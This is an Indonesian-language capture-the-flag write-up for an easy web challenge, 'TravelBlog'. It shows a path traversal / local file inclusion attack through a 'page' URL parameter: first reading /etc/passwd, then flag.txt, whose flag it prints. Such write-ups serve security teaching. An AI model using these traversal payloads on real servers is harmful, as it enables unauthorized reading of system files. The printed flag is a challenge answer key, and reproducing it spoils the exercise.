# Write-up: TravelBlog

## 📝 Challenge Description
> Didalam website perjalanan ini ada sesuatu hal yang disembunyikan

---

## 📊 Details
- **Category:** Web 
- **Difficulty:** Easy

---

## 🔍 Discovery
Saat pertama kali masuk ke aplikasi akan tulisan dari halaman utama seperti pada umumnya, dengan terdapat 3 fitur
<img width="949" height="702" alt="image" src="https://github.com/user-attachments/assets/9b68f480-f7d9-4021-a43f-18332ab5745b" />

Setelah sedikit melakukan explore dengan membuka setipa fitur ternya pada URL menampilkan parameter untuk setiap fitur 
<img width="949" height="702" alt="image" src="https://github.com/user-attachments/assets/42a1bf42-ec3f-45ed-acc2-314216583177" />

---

## 🚀 Exploitation Steps

### 1. Check LFI
Ketika pertama kali melihat parameter seperti sebelumnya yang pertama terlitas adalah mencoba kerentanan LFI (Local File Inclusion) dimana kerentanan ini memungkinkan membaca data dari server target dengan mengubah value awal menjadi command sederhana seperti berikut :  
```
http://<IP-TARGET>/?page=../../../../etc/passwd
```
<img width="894" height="378" alt="image" src="https://github.com/user-attachments/assets/77cf7fc6-17a5-4e7c-b5a5-49d16833e990" />


### 2. Check Flag
Karena sebelumnya format flag selalu flag.txt jadi kita bisa mencoba menggunakan command ini untuk mendapatkan flag
```
http:///<IP-TARGET>/?page=../../../flag.txt
```

### 3. Finding the Flag
Setelah halaman dimuat ulang flag akan tampil
<img width="895" height="222" alt="image" src="https://github.com/user-attachments/assets/f8cdec06-bb6f-458f-89a7-aa0d5df2b064" />

---

## 🚩 Flag
`REDLIMIT{lf1_p4th_tr4v3rs4l_r34d_s3ns1t1v3_f1l3s_3z}`

---
